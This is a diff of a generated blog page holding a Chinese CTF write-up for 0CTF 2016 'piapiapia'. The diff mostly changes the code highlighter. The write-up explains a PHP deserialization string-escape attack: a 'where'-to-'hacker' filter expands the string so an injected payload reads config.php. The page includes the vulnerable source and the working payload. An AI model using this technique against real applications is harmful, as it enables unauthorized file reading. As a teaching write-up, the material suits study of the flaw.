@@ -29,7 +29,15 @@
     
     
       
-      <link  rel="stylesheet" href="https://cdn.staticfile.org/highlight.js/10.1.2/styles/base16/-gigavolt.min.css" />
+      
+        
+          
+          
+          
+        
+        <link  rel="stylesheet" href="https://cdn.staticfile.org/prism/1.22.0/themes/prism-funky.min.css" />
+      
+      
     
   
 
@@ -191,7 +199,7 @@
     
     <span class="post-meta mr-2">
       <i class="iconfont icon-chart"></i>
-      800 字
+      761 字
     </span>
   
 
@@ -201,7 +209,7 @@
       <i class="iconfont icon-clock-fill"></i>
       
       
-      27
+      26
        分钟
     </span>
   
@@ -240,33 +248,33 @@
             <div class="markdown-body">
               <h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p>[0CTF 2016]piapiapia<br><img src="https://ftp.bmp.ovh/imgs/2021/03/c2d7bb4e15e7e536.png" srcset="/img/loading.gif">    </p>
 <h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><p><code>www.zip</code>泄露<br><img src="https://ftp.bmp.ovh/imgs/2021/03/f14c9ff26da419bd.png" srcset="/img/loading.gif"><br>主要利用点：    </p>
-<div class="hljs"><pre><code><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
-	<span class="hljs-keyword">require_once</span>(<span class="hljs-string">&#x27;class.php&#x27;</span>);
-	<span class="hljs-keyword">if</span>($_SESSION[<span class="hljs-string">&#x27;username&#x27;</span>] == <span class="hljs-literal">null</span>) &#123;
-		<span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;Login First&#x27;</span>);	
-	&#125;
-	$username = $_SESSION[<span class="hljs-string">&#x27;username&#x27;</span>];
-	$profile=$user-&gt;show_profile($username);
-	<span class="hljs-keyword">if</span>($profile  == <span class="hljs-literal">null</span>) &#123;
-		header(<span class="hljs-string">&#x27;Location: update.php&#x27;</span>);
-	&#125;
-	<span class="hljs-keyword">else</span> &#123;
-		$profile = unserialize($profile);
-		$phone = $profile[<span class="hljs-string">&#x27;phone&#x27;</span>];
-		$email = $profile[<span class="hljs-string">&#x27;email&#x27;</span>];
-		$nickname = $profile[<span class="hljs-string">&#x27;nickname&#x27;</span>];
-		$photo = base64_encode(file_get_contents($profile[<span class="hljs-string">&#x27;photo&#x27;</span>]));
-<span class="hljs-meta">?&gt;</span></code></pre></div></code></pre>
+<pre><code><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
+	<span class="token keyword">require_once</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'class.php'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+	<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'username'</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token constant">null</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+		<span class="token keyword">die</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'Login First'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>	
+	<span class="token punctuation">&#125;</span>
+	<span class="token variable">$username</span> <span class="token operator">=</span> <span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'username'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+	<span class="token variable">$profile</span><span class="token operator">=</span><span class="token variable">$user</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">show_profile</span><span class="token punctuation">(</span><span class="token variable">$username</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+	<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$profile</span>  <span class="token operator">==</span> <span class="token constant">null</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+		<span class="token function">header</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'Location: update.php'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+	<span class="token punctuation">&#125;</span>
+	<span class="token keyword">else</span> <span class="token punctuation">&#123;</span>
+		<span class="token variable">$profile</span> <span class="token operator">=</span> <span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token variable">$profile</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+		<span class="token variable">$phone</span> <span class="token operator">=</span> <span class="token variable">$profile</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'phone'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+		<span class="token variable">$email</span> <span class="token operator">=</span> <span class="token variable">$profile</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'email'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+		<span class="token variable">$nickname</span> <span class="token operator">=</span> <span class="token variable">$profile</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'nickname'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+		<span class="token variable">$photo</span> <span class="token operator">=</span> <span class="token function">base64_encode</span><span class="token punctuation">(</span><span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token variable">$profile</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'photo'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token delimiter important">?></span></span>   </code></pre></code></pre>
 <p><code>file_get_contents</code><br>读取<code>config.php</code>      </p>
-<div class="hljs"><pre><code><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
-	$config[<span class="hljs-string">&#x27;hostname&#x27;</span>] = <span class="hljs-string">&#x27;127.0.0.1&#x27;</span>;
-	$config[<span class="hljs-string">&#x27;username&#x27;</span>] = <span class="hljs-string">&#x27;root&#x27;</span>;
-	$config[<span class="hljs-string">&#x27;password&#x27;</span>] = <span class="hljs-string">&#x27;&#x27;</span>;
-	$config[<span class="hljs-string">&#x27;database&#x27;</span>] = <span class="hljs-string">&#x27;&#x27;</span>;
-	$flag = <span class="hljs-string">&#x27;&#x27;</span>;
-<span class="hljs-meta">?&gt;</span></code></pre></div></code></pre>
+<pre><code><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
+	<span class="token variable">$config</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'hostname'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token single-quoted-string string">'127.0.0.1'</span><span class="token punctuation">;</span>
+	<span class="token variable">$config</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'username'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token single-quoted-string string">'root'</span><span class="token punctuation">;</span>
+	<span class="token variable">$config</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'password'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token single-quoted-string string">''</span><span class="token punctuation">;</span>
+	<span class="token variable">$config</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'database'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token single-quoted-string string">''</span><span class="token punctuation">;</span>
+	<span class="token variable">$flag</span> <span class="token operator">=</span> <span class="token single-quoted-string string">''</span><span class="token punctuation">;</span>
+<span class="token delimiter important">?></span></span>       </code></pre></code></pre>
 <p><code>update.php</code>      </p>
-<div class="hljs"><pre><code>```php
+<pre><code>```php
 &lt;?php
     require_once(&#39;class.php&#39;);
     if($_SESSION[&#39;username&#39;] == null) &#123;
@@ -297,9 +305,9 @@
         $user-&gt;update_profile($username, serialize($profile));
         echo &#39;Update Profile Success!&lt;a href=&quot;profile.php&quot;&gt;Your Profile&lt;/a&gt;&#39;;
     &#125;
-    else &#123;      </code></pre></div>
+    else &#123;      </code></pre>
 <p>有个<code>serialize</code>序列化<br><code>class.php</code>里的替换函数      </p>
-<div class="hljs"><pre><code>public function filter($string) &#123;
+<pre><code>public function filter($string) &#123;
     $escape = array(&#39;\&#39;&#39;, &#39;\\\\&#39;);
     $escape = &#39;/&#39; . implode(&#39;|&#39;, $escape) . &#39;/&#39;;
     $string = preg_replace($escape, &#39;_&#39;, $string);
@@ -307,11 +315,11 @@
     $safe = array(&#39;select&#39;, &#39;insert&#39;, &#39;update&#39;, &#39;delete&#39;, &#39;where&#39;);
     $safe = &#39;/&#39; . implode(&#39;|&#39;, $safe) . &#39;/i&#39;;
     return preg_replace($safe, &#39;hacker&#39;, $string);
-&#125;         </code></pre></div>
+&#125;         </code></pre>
 <p>where替换为hacker五位变成了六位  </p>
 <ul>
 <li><p>反序列化字符逃逸      </p>
-<div class="hljs"><pre><code>  a:4:&#123;s:5:&quot;phone&quot;;s:11:&quot;12345678912&quot;;s:5:&quot;email&quot;;s:13:&quot;123456@qq.com&quot;;s:8:&quot;nickname&quot;;s:3:&quot;123&quot;;s:5:&quot;photo&quot;;s:39:&quot;upload/562bd805ee2353360acb87cf40a48b19&quot;;&#125;       
+<pre><code>  a:4:&#123;s:5:&quot;phone&quot;;s:11:&quot;12345678912&quot;;s:5:&quot;email&quot;;s:13:&quot;123456@qq.com&quot;;s:8:&quot;nickname&quot;;s:3:&quot;123&quot;;s:5:&quot;photo&quot;;s:39:&quot;upload/562bd805ee2353360acb87cf40a48b19&quot;;&#125;       
   //结果       
   Array
   (
@@ -319,10 +327,10 @@
       [email] =&gt; 123456@qq.com
       [nickname] =&gt; 123
       [photo] =&gt; upload/562bd805ee2353360acb87cf40a48b19
-  )</code></pre></div>
+  )</code></pre>
 </li>
 </ul>
-<div class="hljs"><pre><code>    a:4:&#123;s:5:&quot;phone&quot;;s:11:&quot;12345678912&quot;;s:5:&quot;email&quot;;s:13:&quot;123456@qq.com&quot;;s:8:&quot;nickname&quot;;s:3:&quot;123&quot;;s:5:&quot;photo&quot;;s:10:&quot;config.php&quot;;&#125;s:39:&quot;upload/562bd805ee2353360acb87cf40a48b19&quot;;&#125;      
+<pre><code>    a:4:&#123;s:5:&quot;phone&quot;;s:11:&quot;12345678912&quot;;s:5:&quot;email&quot;;s:13:&quot;123456@qq.com&quot;;s:8:&quot;nickname&quot;;s:3:&quot;123&quot;;s:5:&quot;photo&quot;;s:10:&quot;config.php&quot;;&#125;s:39:&quot;upload/562bd805ee2353360acb87cf40a48b19&quot;;&#125;      
     //结果       
     Array
     (
@@ -330,7 +338,7 @@
         [email] =&gt; 123456@qq.com
         [nickname] =&gt; 123
         [photo] =&gt; config.php
-    )        </code></pre></div>
+    )        </code></pre>
 <p><code>&#125;</code>提前出现，反序列化就会提前结束<br>替换会多一位，多余的位会将原来的挤出来，也就是只会根据前面的数值规定的几位来读，读到规定的位数，这一块反序列化就停止了；而多余的那部分会被认为是下一块<br><code>;s:5:&quot;photo&quot;;s:10:&quot;config.php&quot;;&#125;</code>将这一块从nickname里挤出来，就成photo里的了，然后就能读出<code>config.php</code>       </p>
 <p>nickname有长度限制可以用数组<br>数组的序列化是以<code>&#123;&#125;</code>括住的<br>所以上面的前面要加一个<code>&#125;</code>闭合数组的序列化<br><code>where*34&quot;;&#125;s:5:&quot;photo&quot;;s:10:&quot;config.php&quot;;&#125;</code>        </p>
 <h2 id="解"><a href="#解" class="headerlink" title="解"></a>解</h2><p>在<code>update.php</code>里上传抓包<br>改nickname伪数组和其内容<br><img src="https://ftp.bmp.ovh/imgs/2021/03/ccbc2725f789e2d3.png" srcset="/img/loading.gif">     </p>
@@ -479,6 +487,8 @@
 
 
 
+  
+    
   
 
 
